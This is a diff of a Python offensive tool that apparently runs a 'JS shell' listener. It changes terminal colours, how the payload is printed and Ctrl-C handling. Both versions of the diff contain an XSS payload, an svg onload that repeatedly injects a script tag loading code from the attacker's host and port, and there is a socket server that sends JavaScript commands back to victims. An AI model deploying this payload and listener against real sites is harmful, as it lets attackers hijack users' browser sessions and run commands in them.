@@ -4,10 +4,9 @@ import sys
 from requests import get
 import argparse
 
-white = '\033[1;97m'
 red = '\033[1;31m'
 white = '\033[1;m'
-blue = '\033[0;34m'
+blue = '\033[1;34m'
 if sys.platform == 'win32':
     white = red = white = blue = ''
     
@@ -43,13 +42,12 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1111)>\n' % (host, port)
+payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1111)>\n' % (blue, host, port)
 
 
 print(banner)
 if gene == True:
-    print('%sPayload:' % blue)
-    print(payload)
+    print('%sPayload:  %s' % (white, payload))
     
 print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
         
@@ -60,8 +58,6 @@ Content-Type: application/javascript
 Connection: close
 
 '''
-    i = 0
-    history = ''
     while 1:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind(('0.0.0.0', port))
@@ -82,7 +78,8 @@ Connection: close
             c.send(form + buffer.encode())
             c.close()
         except KeyboardInterrupt:
-            print('\n^C')
+            if sys.platform == 'win32':
+                print('\nControl-C')
             s.close()
             break
         except Exception as msg:
